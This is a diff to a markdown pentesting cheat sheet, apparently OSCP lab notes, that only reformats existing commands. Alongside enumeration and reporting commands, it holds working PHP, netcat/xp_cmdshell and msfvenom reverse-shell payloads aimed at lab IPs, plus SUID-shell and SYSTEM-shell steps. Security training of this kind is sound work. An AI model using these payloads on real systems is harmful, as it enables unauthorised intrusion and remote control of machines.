@@ -1,80 +1,82 @@
 # Upgrade a TTY shell
-python -c 'import pty; pty.spawn("/bin/bash")'
+`python -c 'import pty; pty.spawn("/bin/bash")'`
 
 # Search for files owned by root but writeable by current user
-find / -xdev -user root -perm -o+w -type f 2>/dev/null
+`find / -xdev -user root -perm -o+w -type f 2>/dev/null`
 
 # Numerically sort a list of IP addresses
-sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4 smb-boxes.txt
+`sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4 smb-boxes.txt`
 
 # Find SUID0 Binaries
-find / -perm /4000 2>/dev/null
+`find / -perm /4000 2>/dev/null`
 
 # Nikto commands
 
-nikto -host 192.168.1.164 -output 192.168.1.164_80_nikto.txt
+`nikto -host 192.168.1.164 -output 192.168.1.164_80_nikto.txt`
 
 # SMB Commands
-smbclient -L \\\\RED -I 10.1.1.129 -U "" -N
+`smbclient -L \\\\RED -I 10.1.1.129 -U "" -N`
 
-smbclient \\\\RED\\kathy -I 10.1.1.129 -U "" -N
+`smbclient \\\\RED\\kathy -I 10.1.1.129 -U "" -N`
 
-enum4linux -a 10.1.1.129 | tee enum4linux_output.txt
+`enum4linux -a 10.1.1.129 | tee enum4linux_output.txt`
 
 # GoBuster commands
-gobuster -u http://192.168.1.164 -w /usr/share/seclists/Discovery/Web-Content/common.txt -s 200,204,301,302,307,403,500 -e -o gobuster-web-common-output.txt
+`gobuster -u http://192.168.1.164 -w /usr/share/seclists/Discovery/Web-Content/common.txt -s 200,204,301,302,307,403,500 -e -o gobuster-web-common-output.txt`
 
-gobuster -u http://192.168.1.164/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s 200,204,301,302,307,403,500 -e -o gobuster-web-cgis-output.txt
+`gobuster -u http://192.168.1.164/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s 200,204,301,302,307,403,500 -e -o gobuster-web-cgis-output.txt`
 
-gobuster -u http://192.168.1.164/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s 200,204,301,302,307,403,500 -e -o gobuster-dir2.3med-output.txt
+`gobuster -u http://192.168.1.164/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s 200,204,301,302,307,403,500 -e -o gobuster-dir2.3med-output.txt`
 
-gobuster -u http://192.168.1.164 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s 200,204,301,302,307,403,500 -x php -e -o gobuster-dir2.3med-php-output.txt
+`gobuster -u http://192.168.1.164 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s 200,204,301,302,307,403,500 -x php -e -o gobuster-dir2.3med-php-output.txt`
 
 # Fix BurpSuite errors when communicating with old machines
-java -Djsse.enableSNIExtension=false -jar /usr/bin/burpsuite
+`java -Djsse.enableSNIExtension=false -jar /usr/bin/burpsuite`
 
 # PHP reverse shell using bash
 ## Used on a VM when php-reverse-shell.php didn't work
-<?php echo shell_exec("bash -i >& /dev/tcp/10.11.0.141/443 0>&1");?>
+`<?php echo shell_exec("bash -i >& /dev/tcp/10.11.0.141/443 0>&1");?>`
 
 ## Used on Zico for phpliteadmin
-<?php $sock=fsockopen("192.168.1.141",443);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>
+`<?php $sock=fsockopen("192.168.1.141",443);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>`
 
 # Take screenshots in format YY-MM-DD_HH-MM-SS, e.g. kali-screenshot-20-05-12_20-27-13
-gnome-screenshot -f /mnt/hgfs/vm_share/kali-screenshots/kali-screenshot-$(date +%y-%m-%d_%H-%M-%S).png
+`gnome-screenshot -f /mnt/hgfs/vm_share/kali-screenshots/kali-screenshot-$(date +%y-%m-%d_%H-%M-%S).png`
 
 # Take screenshots without screen blinking
-import -window root "/mnt/hgfs/vm_share/kali-screenshots/kali-screenshot-$(date +%y-%m-%d_%H-%M-%S).png"
+`import -window root "/mnt/hgfs/vm_share/kali-screenshots/kali-screenshot-$(date +%y-%m-%d_%H-%M-%S).png"`
 
 # Parse nslookup files
-cat dns-lookups.txt | sort -u | cut -f1 | cut -d\. -f 1,2,3,4| awk -F. '{print $4"."$3"." $2"."$1}' > ipsonly
-cat dns-lookups.txt | sort -u | cut -f2 | cut -d" " -f 3 | cut -d\. -f1-3 > namesonly
+`cat dns-lookups.txt | sort -u | cut -f1 | cut -d\. -f 1,2,3,4| awk -F. '{print $4"."$3"." $2"."$1}' > ipsonly`
+`cat dns-lookups.txt | sort -u | cut -f2 | cut -d" " -f 3 | cut -d\. -f1-3 > namesonly`
 
 # Use xp_cmdshell extended procedure to spawn a shell
+```
 exec xp_cmdshell 'nc.exe -e cmd.exe 10.11.0.41 443'
 go;
+```
 
 # Determine build information of windows
 Based on https://superuser.com/questions/363018/how-do-i-tell-what-version-and-edition-of-windows-is-on-the-filesystem you can find the Windows Version and Service pack in C:\Windows\System32\license.rtf for Windows 7. For Windows XP the information is in C:\Windows\System32\eula.txt. For Windows 10 licenses.rtf does not contain the version. Instead it contains the EULA code, which you can use to find the version online.
 
 # Aliases for screenshots and copying stdout to clipboard
-alias clip="xclip -i -sel p -f | xclip -i -sel c"
+`alias clip="xclip -i -sel p -f | xclip -i -sel c"`
 
 # Mount vm_share
-sudo vmhgfs-fuse -o nonempty -o allow_other .host:/vm_share /mnt/vm_share
+`sudo vmhgfs-fuse -o nonempty -o allow_other .host:/vm_share /mnt/vm_share`
 
 # Generate lab report
-rm OSCP-OS-XXXXX-Lab-Report.pdf ; pandoc OSCP-OS-XXXXX-Lab-Report.md -o OSCP-OS-XXXXX-Lab-Report.pdf --from markdown+yaml_metadata_block+raw_html --template eisvogel --table-of-contents --toc-dept 6 --number-sections --top-level-division=chapter --highlight-style breezedark
+`rm OSCP-OS-XXXXX-Lab-Report.pdf ; pandoc OSCP-OS-XXXXX-Lab-Report.md -o OSCP-OS-XXXXX-Lab-Report.pdf --from markdown+yaml_metadata_block+raw_html --template eisvogel --table-of-contents --toc-dept 6 --number-sections --top-level-division=chapter --highlight-style breezedark`
 
 # Generate exam report
-rm OSCP-OS-XXXXX-Exam-Report.pdf ; pandoc OSCP-OS-XXXXX-Exam-Report.md -o OSCP-OS-XXXXX-Exam-Report.pdf --from markdown+yaml_metadata_block+raw_html --template eisvogel --table-of-contents --toc-dept 6 --number-sections --top-level-division=chapter --highlight-style breezedark
+`rm OSCP-OS-XXXXX-Exam-Report.pdf ; pandoc OSCP-OS-XXXXX-Exam-Report.md -o OSCP-OS-XXXXX-Exam-Report.pdf --from markdown+yaml_metadata_block+raw_html --template eisvogel --table-of-contents --toc-dept 6 --number-sections --top-level-division=chapter --highlight-style breezedark`
 
 # Print unique list of pwnt machines
-find . -name proof.txt | cut -d\/ -f 2 | sort -Vu
+`find . -name proof.txt | cut -d\/ -f 2 | sort -Vu`
 
 # Run LinEnum.sh and output report, t for slow tests
-./linenum.sh -r linenum-output.txt
-./linenum.sh -t -r linenum-output-thorough.txt
+`./linenum.sh -r linenum-output.txt`
+`./linenum.sh -t -r linenum-output-thorough.txt`
 
 # Linux Exploit Suggester Usage
 victim-host$ dpkg -l > pkgsListing.txt
@@ -84,7 +86,7 @@ https://www.prodefence.org/linux-exploit-suggester-linux-privilege-escalation-au
     $ (uname -s; uname -m; uname -r; uname -v) | curl -s https://api-ksplice.oracle.com/api/1/update-list/ -L -H "Accept: text/text" --data-binary @- | grep CVE | tr ' ' '\n' | grep -o -E 'CVE-[0-9]+-[0-9]+' | sort -r -n | uniq
 
 # Spawn SYSTEM shell with psexec
-psexec -i -s cmd.exe
+`psexec -i -s cmd.exe`
 
 # Bad characters
 
@@ -117,14 +119,14 @@ badchars = (
 ```
 
 # Generate msfvenom shellcode
-msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.41 LPORT=9001 -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -n 16 -f python
+`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.41 LPORT=9001 -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -n 16 -f python`
 
-msfvenom -p windows/shell_reverse_tcp -f exe-service -o payload.exe LHOST=10.11.0.41 LPORT=9001
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -f raw > shell.jsp
-msfvenom -p java/shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -f war > reverse_shell.war
-msfvenom -p php/reverse_php LHOST=10.11.0.33 LPORT=443 > /var/www/html/evil.txt
-msfvenom -p linux/x86/shell/reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f elf > staged-shell.elf
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f elf > non-staged-shell.elf
+`msfvenom -p windows/shell_reverse_tcp -f exe-service -o payload.exe LHOST=10.11.0.41 LPORT=9001`
+`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -f raw > shell.jsp`
+`msfvenom -p java/shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -f war > reverse_shell.war`
+`msfvenom -p php/reverse_php LHOST=10.11.0.33 LPORT=443 > /var/www/html/evil.txt`
+`msfvenom -p linux/x86/shell/reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f elf > staged-shell.elf`
+`msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f elf > non-staged-shell.elf`
 
 # Generate bad characters
 ```python
@@ -147,11 +149,11 @@ int main(void)
 ```
 
 # Mark binary as SUID0
-chown root:root /dev/shm/suid-shell ; chmod 7775 /dev/shm/suid-shell
+`chown root:root /dev/shm/suid-shell ; chmod 7775 /dev/shm/suid-shell`
 
 # Recursive icacls search with powershell
-Get-ChildItem C:\temp\ -Recurse | Get-Acl | grep "Everyone"
+`Get-ChildItem C:\temp\ -Recurse | Get-Acl | grep "Everyone"`
 
 # AutoRecon
-python3 /opt/AutoRecon/src/autorecon.py -ct 2 -cs 2 -t TARGET_FILE --only-scans-dir
+`python3 /opt/AutoRecon/src/autorecon.py -ct 2 -cs 2 -t TARGET_FILE --only-scans-dir`
 
